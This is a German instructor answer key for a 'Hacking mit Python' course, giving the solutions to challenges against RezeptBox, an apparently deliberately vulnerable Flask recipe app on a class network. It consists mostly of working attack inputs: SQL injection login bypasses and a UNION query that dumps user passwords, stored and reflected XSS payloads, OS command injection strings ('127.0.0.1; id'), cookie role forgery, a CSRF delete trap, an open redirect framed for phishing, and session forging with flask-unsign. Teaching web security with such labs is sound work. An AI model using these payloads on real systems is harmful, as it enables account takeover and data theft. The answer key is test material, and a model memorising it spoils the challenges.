# ✅ RezeptBox – Challenge-Lösungen

> **Lösungsschlüssel zu `CHALLENGES.md`** für die Vorlesung **„Hacking mit Python"**.
> Diese Datei ist **nur für Dozent:innen / zum Nachschauen** gedacht – die
> Tester:innen bekommen `CHALLENGES.md` (ohne Lösungen).
>
> Jede Challenge verweist auf die ausführliche Lücken-Beschreibung in
> [`LUECKEN.md`](LUECKEN.md). Hier steht pro Challenge die **direkte Lösung**.
>
> 🌐 Server im Klassen-WLAN: `http://141.87.60.80:8000`
> _(Beispiele mit `localhost` funktionieren nur auf dem Server selbst – sonst IP einsetzen.)_

---

## Zuordnung Challenge → Lücke

| Challenge | Thema                          | Lücke in `LUECKEN.md` |
|-----------|--------------------------------|-----------------------|
| 1         | Login-Bypass                   | #1 SQL-Injection Login |
| 2         | DB auslesen                    | #3 UNION-SQLi Rezept-Detail |
| 3         | Stored XSS                     | #4 Stored XSS |
| 4         | Reflected XSS                  | #5 Reflected XSS |
| 5         | OS Command Injection           | #7 OS Command Injection |
| 6         | Admin werden                   | #8 Broken Access Control (Cookie) |
| 7         | Fremdes Rezept bearbeiten      | #9 IDOR Bearbeiten |
| 8         | Rezept löschen per Falle       | #10 CSRF + Löschen per GET |
| 9         | Open Redirect                  | #11 Open Redirect |
| 10 (Bonus)| Registrierungs-SQLi            | #2 SQL-Injection Registrierung |
| 11 (Bonus)| Session fälschen               | #13 Schwacher secret_key |

---

## Challenge 1 – Türsteher austricksen 🔑

**Lösung (Login-SQLi):** Im Feld **Benutzername** einen SQL-Kommentar oder eine
immer-wahre Bedingung eingeben, Passwort beliebig.

- Als bekannter Nutzer: Benutzername `admin' --`, Passwort egal → eingeloggt als `admin`.
- Ohne Nutzer zu kennen: Benutzername `' OR '1'='1`.

Der Username landet unescaped in der SQL-Query, `--` kommentiert die
Passwort-Prüfung weg. → siehe `LUECKEN.md` #1.

## Challenge 2 – Blick in die Datenbank 🗄️

**Lösung (UNION-SQLi):** In die Adressleiste eine URL mit `UNION SELECT` eingeben,
die statt eines Rezepts die `users`-Tabelle lädt (Abfrage hat 5 Spalten):

```
http://141.87.60.80:8000/rezept/0 UNION SELECT 1,username,password,4,5 FROM users
```

`id=0` existiert nicht, daher kommt die angezeigte Zeile komplett aus dem
UNION-Teil: Spalte 2 = Titel (Benutzername), Spalte 3 = Inhalt (Passwort).
→ siehe `LUECKEN.md` #3.

## Challenge 3 – Code einschleusen (sichtbar für alle) 💥

**Lösung (Stored XSS):** Neues Rezept anlegen und in **Titel** oder **Inhalt**
HTML/JS einschleusen, z. B.:

```html
<script>alert(document.cookie)</script>
```
oder `<img src=x onerror=alert(1)>`

Nach dem Speichern wird der Code bei **jedem** ausgeführt, der das Rezept (oder
das Dashboard) öffnet, weil die Ausgabe mit `|safe` erfolgt.
Zum stillen Vorführen: `<b style=color:red>GEHACKT</b>`. → siehe `LUECKEN.md` #4.

> ⚠️ Danach Test-Rezepte mit aktiven Payloads wieder löschen, sonst feuern sie bei jedem Laden.

## Challenge 4 – Code über einen Link 🔗

**Lösung (Reflected XSS):** Suchbegriff als Code in die URL packen – das Dashboard
gibt `q` ungeescaped wieder aus:

```
http://141.87.60.80:8000/dashboard?q=<script>alert(42)</script>
```

Allein das Öffnen des Links löst den Code aus. Für einen echten Angriff schickt
man einem eingeloggten Opfer genau diesen Link. → siehe `LUECKEN.md` #5.

## Challenge 5 – Befehle auf dem Server ausführen 🖥️

**Lösung (OS Command Injection):** Auf `/tools` ins Feld **Host / IP** nicht nur
eine IP, sondern einen angehängten zweiten Befehl eingeben:

- Windows: `127.0.0.1 & whoami`
- Linux/Mac: `127.0.0.1; id`

Unter der Ping-Ausgabe erscheint das Ergebnis (z. B. der Server-Benutzer), weil
die Eingabe direkt an `os.popen` geht. Weiter: `& dir` bzw. `; ls -la`.
→ siehe `LUECKEN.md` #7.

## Challenge 6 – Admin werden 👑

**Lösung (Broken Access Control via Cookie):** Die Rolle wird aus dem clientseitig
änderbaren Cookie `role` gelesen. Als normaler Nutzer einloggen, dann DevTools
(**F12**) → Konsole:

```js
document.cookie = "role=admin"
```

Danach `http://141.87.60.80:8000/admin` aufrufen → alle Konten inkl.
Klartext-Passwörter. (Alternativ Cookie unter Application → Cookies setzen.)
→ siehe `LUECKEN.md` #8.

## Challenge 7 – Fremdes Rezept übernehmen ✏️

**Lösung (IDOR):** Es wird nicht geprüft, wem ein Rezept gehört. Einfach die ID
eines **fremden** Rezepts in die Edit-URL setzen:

```
http://141.87.60.80:8000/rezept/1/edit
```

Titel/Inhalt ändern, speichern – obwohl das Rezept jemand anderem gehört.
→ siehe `LUECKEN.md` #9.

## Challenge 8 – Rezept per Falle löschen 🗑️

**Lösung (CSRF + GET-Delete):** Löschen passiert per einfachem GET ohne Token und
ohne Besitzprüfung.

- Direkt: `http://141.87.60.80:8000/rezept/3/delete` aufrufen → Rezept #3 ist weg.
- Als CSRF-Falle auf einer fremden Seite:

  ```html
  <img src="http://141.87.60.80:8000/rezept/3/delete">
  ```

  Öffnet ein eingeloggtes Opfer die Seite, lädt der Browser das „Bild" und löscht
  dabei Rezept #3 – ohne Zutun des Opfers. → siehe `LUECKEN.md` #10.

## Challenge 9 – Weiterleitung auf fremde Seite 🪝

**Lösung (Open Redirect):** Das `next`-Ziel nach dem Login wird nicht geprüft:

```
http://141.87.60.80:8000/login?next=https://example.com
```

Nach erfolgreichem Login landet man auf der fremden Adresse – ideal für Phishing
mit nachgebauter Login-Seite. → siehe `LUECKEN.md` #11.

---

## 🏆 Bonus-Challenges

## Challenge 10 – Neuen Benutzer einschmuggeln

**Lösung (Registrierungs-SQLi):** String-Verkettung im `INSERT`. Als
**Benutzername** eingeben:

```
hacker', 'pw'); --
```

Passwort und Wiederholung auf `pw`. Absenden → entweder ein zusätzlicher Benutzer
wird angelegt, oder es erscheint eine SQL-Fehlermeldung, die die DB-Struktur
verrät. → siehe `LUECKEN.md` #2.

## Challenge 11 – Sitzung fälschen

**Lösung (schwacher secret_key):** Der Schlüssel steht im Quellcode:
`app.secret_key = "schulung-nicht-geheim"`. Damit lässt sich ein eigenes gültiges
Session-Cookie bauen:

```bash
pip install flask-unsign
flask-unsign --sign --cookie "{'user': 'admin'}" --secret "schulung-nicht-geheim"
```

In den DevTools das `session`-Cookie durch den erzeugten Wert ersetzen → man ist
`admin`, ohne je ein Passwort gekannt zu haben. → siehe `LUECKEN.md` #13.

---

## 🔎 Nicht als eigene Challenge, aber relevant

Diese Lücken tauchen in den Lösungen oben mit auf:

- **#6 SQL-Injection im Suchfeld** (`/dashboard?q=`): `xxx%' OR '1'='1` zeigt alle
  Rezepte; fortgeschritten mit `UNION SELECT` kombinierbar.
- **#12 Klartext-Passwörter**: nach #2/#3/#8 direkt lesbar, kein Hash zu knacken.
- **#14 Debug-Modus / Werkzeug-Debugger-RCE**: Exception auslösen → Traceback →
  Konsolen-Symbol → Debugger-PIN (steht im Server-Log) → beliebiger Python-Code.
